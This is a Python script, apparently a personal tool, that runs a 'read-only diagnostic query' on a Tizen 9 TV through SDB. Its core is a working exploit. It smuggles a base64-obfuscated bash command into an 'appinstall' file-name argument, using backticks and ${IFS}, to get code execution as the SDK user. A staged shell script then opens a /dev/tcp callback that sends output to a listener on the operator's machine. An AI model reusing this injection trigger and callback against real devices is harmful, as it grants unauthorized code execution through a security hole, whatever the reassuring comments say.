"""One-shot read-only Home query. No apply, restore, launch or signing commands."""
import argparse
import base64
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import re
import socket
import subprocess
import time
import uuid


REMOTE = '/home/owner/share/tmp/sdk_tools'
PREFIX = 'CLEANFRAME_HOME_QUERY='


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--host', required=True)
    parser.add_argument('--sdb', default='~/tizen-studio/tools/sdb')
    args = parser.parse_args()
    host = str(ipaddress.IPv4Address(args.host))
    sdb = str(Path(args.sdb).expanduser())
    serial = host + ':26101'
    folder = Path(__file__).resolve().parent
    manifest = json.loads((folder / 'manifest.json').read_text())
    names = ['Query.dll', 'Query.runtimeconfig.json']
    for name in names:
        if hashlib.sha256((folder / name).read_bytes()).hexdigest() != manifest['files'][name]:
            raise RuntimeError('Helper checksum failed: ' + name)

    def run(*command):
        result = subprocess.run([sdb, *command], capture_output=True, text=True, timeout=20)
        if result.returncode:
            raise RuntimeError('SDB failed: ' + result.stdout[-1000:] + result.stderr[-1000:])
        return result.stdout

    devices = run('devices')
    if not any(line.split()[:2] == [serial, 'device'] for line in devices.splitlines()):
        raise RuntimeError('TV is not connected. Run your SDB reconnect sequence first.')
    caps = run('-s', serial, 'capability')
    if not re.search(r'^cpu_arch:armv7\s*$', caps, re.M) or not re.search(r'^platform_version:9\.0\s*$', caps, re.M):
        raise RuntimeError('Expected ARMv7 Tizen 9; nothing staged.')

    token = uuid.uuid4().hex[:12]
    stage = f'{REMOTE}/cfhq-{token}.s'
    claimed = f'{REMOTE}/cfhq-{token}.r'
    paths = {name: f'{REMOTE}/cfhq-{token}-{name}' for name in names}
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        local = str(ipaddress.IPv4Address(route.getsockname()[0]))
    with socket.socket() as listener:
        listener.bind((local, 0))
        listener.listen(1)
        listener.settimeout(35)
        port = listener.getsockname()[1]
        cleanup = 'rm -f ' + ' '.join([stage, claimed, *paths.values()])
        checks = '\n'.join(f"printf '%s  %s\\n' '{manifest['files'][name]}' '{paths[name]}' | sha256sum -c - >/dev/null" for name in names)
        # Unique file prefix also gives dotnet the matching runtimeconfig basename.
        script = f'''set -u
umask 077
trap '{cleanup}' EXIT
exec 3<>/dev/tcp/{local}/{port} || exit 80
(
set -eu
test "$(id -u)" = 901
test -x /usr/bin/dotnet
{checks}
/usr/bin/dotnet {paths['Query.dll']}
) >&3 2>&3
result=$?
{cleanup}
cleaned=$?
printf '\\nCLEANFRAME_QUERY_CLEANUP=%s\\nCLEANFRAME_QUERY_EXIT=%s\\n' "$cleaned" "$result" >&3
exec 3>&-
exit "$result"
'''
        shell = folder / ('query-' + token + '.sh')
        shell.write_text(script)
        claim = f'/bin/mv {stage} {claimed} 2>/dev/null&&/bin/cat {claimed}|/bin/bash'
        encoded = base64.b64encode(claim.encode()).decode()
        trigger = '0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
        if len(trigger.encode()) > 400:
            shell.unlink()
            raise RuntimeError('Transport argument too long; nothing staged.')
        print('Staging a read-only query as SDK UID 901. No Home/startup writes.', flush=True)
        proc = None
        try:
            for name in names:
                run('-s', serial, 'push', str(folder / name), paths[name])
            run('-s', serial, 'push', str(shell), stage)
            proc = subprocess.Popen([sdb, '-s', serial, 'shell', trigger], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            connection, peer = listener.accept()
            if peer[0] != host:
                connection.close()
                raise RuntimeError('Unexpected callback peer.')
            data = bytearray()
            with connection:
                connection.settimeout(20)
                while True:
                    chunk = connection.recv(8192)
                    if not chunk:
                        break
                    data.extend(chunk)
                    if len(data) > 131072:
                        raise RuntimeError('Output limit exceeded.')
            output = data.decode('utf-8', errors='replace')
            stamp = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime()) + '-' + token
            log = folder / ('query-' + stamp + '.txt')
            with log.open('x') as target:
                target.write(output)
            os.chmod(log, 0o600)
            print(output)
            if output.splitlines().count('CLEANFRAME_QUERY_CLEANUP=0') != 1 or output.splitlines().count('CLEANFRAME_QUERY_EXIT=0') != 1:
                raise RuntimeError('Query or cleanup failed. Review the saved output; no baseline accepted.')
            matches = [line[len(PREFIX):] for line in output.splitlines() if line.startswith(PREFIX)]
            if len(matches) != 1:
                raise RuntimeError('Expected exactly one result; no baseline accepted.')
            result = json.loads(matches[0])
            if result.get('uid') != 901 or result.get('architecture') != 'Arm':
                raise RuntimeError('Unexpected helper identity; no baseline accepted.')
            record = {'host': host, 'serial': serial, 'capability': caps, 'query': result, 'helper': manifest}
            destination = folder / ('snapshot-' + stamp + '.json')
            with destination.open('x') as target:
                json.dump(record, target, indent=2)
            os.chmod(destination, 0o600)
            print('Saved diagnostic snapshot:', destination)
            print('This is a review candidate, not an approved recovery baseline. No settings changed.')
        except Exception:
            print('If cleanup was not confirmed, these temporary files may remain:\n' + '\n'.join([stage, claimed, *paths.values()]))
            raise
        finally:
            shell.unlink(missing_ok=True)
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait(timeout=3)


if __name__ == '__main__':
    try:
        main()
    except (OSError, ValueError, RuntimeError, subprocess.SubprocessError) as error:
        raise SystemExit(str(error))
